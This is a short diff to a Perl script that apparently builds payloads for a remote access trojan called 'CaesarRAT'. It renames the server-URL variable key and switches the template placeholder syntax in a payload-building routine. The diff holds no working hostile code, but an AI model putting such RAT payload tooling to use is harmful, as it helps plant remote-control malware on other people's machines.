@@ -40,7 +40,7 @@ sub Main {
         
         if($caesar_install) {
             my $variables = {
-                CAESAR_URL => $caesar_url,
+                'CAESAR-URL' => $caesar_url,
             };
             print "[+] CaesarRAT installation found.\n\n";
             
@@ -87,10 +87,10 @@ sub build_payload {
     my @final_payload = ();
     
     foreach my $line (@template_content) {
-        if($line =~ m/<([a-zA-Z0-9\-\_]+)>/i) {
+        if($line =~ m/__([a-zA-Z0-9\-]+)__/i) {
             my $replacement = "";
             $replacement = $variables->{uc($1)} if(defined($variables->{uc($1)}) && $variables->{uc($1)});
-            $line =~ s/<$1>/$replacement/gi;
+            $line =~ s/__$1__/$replacement/gi;
         }
         push(@final_payload, $line);
     }
